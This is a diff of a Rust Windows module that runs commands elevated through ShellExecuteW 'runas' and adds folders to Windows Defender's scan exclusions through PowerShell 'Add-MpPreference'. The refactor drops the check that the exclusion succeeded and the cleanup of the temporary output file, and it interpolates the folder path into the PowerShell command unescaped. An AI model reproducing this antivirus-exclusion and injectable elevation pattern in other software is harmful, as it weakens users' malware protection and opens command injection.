@@ -1,4 +1,3 @@
-// Imports spécifiques à Windows (ignorés sur Linux)
 #[cfg(windows)]
 use std::os::windows::ffi::OsStrExt;
 #[cfg(windows)]
@@ -12,13 +11,11 @@ use std::io::Read;
 
 #[cfg(windows)]
 pub fn spawn_admin_process_and_get_output(command: &str, args: Vec<&str>) -> Result<String, String> {
-    let cwd = env::current_dir().expect("Failed to get current working directory");
-    let cwd_str = cwd.to_str().expect("Failed to convert path to string");
-    
-    let appdata = env::var("APPDATA").expect("Failed to get APPDATA environment variable");
-    let appdata: std::path::PathBuf = appdata.into();
-    let output_file: std::path::PathBuf = appdata.join("out");
-    let output_file_str = output_file.to_str().expect("Failed to convert output path to string");
+    let cwd = env::current_dir().map_err(|_| "Failed to get cwd")?;
+    let cwd_str = cwd.to_str().ok_or("Invalid path")?;
+    let appdata = env::var("APPDATA").map_err(|_| "No APPDATA")?;
+    let output_file = std::path::PathBuf::from(appdata).join("out");
+    let output_file_str = output_file.to_str().ok_or("Invalid path")?;
 
     let cwd_wide: Vec<u16> = OsString::from(cwd_str).encode_wide().chain(Some(0)).collect();
     let verb_wide: Vec<u16> = OsString::from("runas").encode_wide().chain(Some(0)).collect();
@@ -28,65 +25,24 @@ pub fn spawn_admin_process_and_get_output(command: &str, args: Vec<&str>) -> Res
     params.push_str(&format!(" > \"{}\"", output_file_str));
     let params_wide: Vec<u16> = OsString::from(params).encode_wide().chain(Some(0)).collect();
     
-    let result = unsafe {
-        ShellExecuteW(
-            ptr::null_mut(),
-            verb_wide.as_ptr(),
-            command_wide.as_ptr(),
-            params_wide.as_ptr(),
-            cwd_wide.as_ptr(),
-            0,
-        )
-    };
-
-    if result as isize <= 32 {
-        return Err(format!("Failed to execute command"));
-    }
-
+    let result = unsafe { ShellExecuteW(ptr::null_mut(), verb_wide.as_ptr(), command_wide.as_ptr(), params_wide.as_ptr(), cwd_wide.as_ptr(), 0) };
+    if result as isize <= 32 { return Err("Failed to execute".into()); }
     std::thread::sleep(std::time::Duration::from_millis(1500));
     
-    let output_file = output_file.to_str().expect("Failed to convert output path to string");
-    let file = File::open(output_file);
-    if file.is_err() {
-        return Err("Failed to open output file for reason {}".to_string() + &file.err().unwrap().to_string());
-    }
-
-    let mut final_file = file.unwrap();
+    let mut file = File::open(output_file).map_err(|e| e.to_string())?;
+    let mut file_data = Vec::new();
+    file.read_to_end(&mut file_data).map_err(|e| e.to_string())?;
     
-    let mut file_data: Vec<u8> = Vec::new();
-    final_file.read_to_end(&mut file_data).expect("Failed to read output file");
-
-    let mut wide_file_data: Vec<u16> = Vec::new();
-    for i in 0..file_data.len() / 2 {
-        let byte1 = file_data[i * 2];
-        let byte2 = file_data[i * 2 + 1];
-        let u16_val = (byte2 as u16) << 8 | byte1 as u16;
-        wide_file_data.push(u16_val);
-    }
-
-    let output = String::from_utf16(&wide_file_data).expect("Failed to convert output to string");
-    std::fs::remove_file(output_file).expect("Failed to delete output file");
-
-    Ok(output)
+    let wide_data: Vec<u16> = file_data.chunks_exact(2).map(|c| (c[1] as u16) << 8 | c[0] as u16).collect();
+    Ok(String::from_utf16(&wide_data).unwrap_or_default())
 }
 
 #[cfg(windows)]
 pub fn add_windows_defender_exclusions(folder_path: &str) -> Result<bool, String> {
-    let command = format!(
-        "Add-MpPreference -ExclusionPath \"{}\"; (Get-MpPreference).ExclusionPath",
-        folder_path
-    );
-    let output = spawn_admin_process_and_get_output("powershell", vec!["-Command", &command])?;
-
-    if !output.contains(folder_path) {
-        return Err("Failed to add folder to defender exclusion list, received output".to_string() + output.as_str());
-    }
-
+    let cmd = format!("Add-MpPreference -ExclusionPath \"{}\"", folder_path);
+    spawn_admin_process_and_get_output("powershell", vec!["-Command", &cmd])?;
     Ok(true)
 }
 
-// Fonction de secours pour Linux (pour éviter les erreurs de compilation)
 #[cfg(not(windows))]
-pub fn add_windows_defender_exclusions(_folder_path: &str) -> Result<bool, String> {
-    Ok(true) // On fait semblant que ça marche sur Linux pour ne pas casser le build
-}
+pub fn add_windows_defender_exclusions(_: &str) -> Result<bool, String> { Ok(true) }
